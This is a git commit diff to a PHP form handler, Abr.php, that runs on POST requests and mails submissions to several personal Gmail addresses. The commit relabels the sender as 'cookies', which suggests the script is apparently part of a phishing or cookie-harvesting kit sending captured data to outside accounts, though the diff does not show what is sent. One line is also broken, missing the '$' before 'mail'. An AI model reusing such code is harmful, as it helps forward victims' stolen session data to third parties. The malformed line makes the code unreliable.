1207220ea2617813f1726ca5ab7873ab088f4dba
advastong542 <advastingteam51@gmail.com>
2025-07-15 17:25:33 +0500

    Update Abr.php

--- Abr.php
+++ Abr.php
@@ -34,7 +34,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('Lernayouamzaxal@gmail.com', 'abr');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'cookies');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
        mail->addAddress('morginmocin@gmail.com');
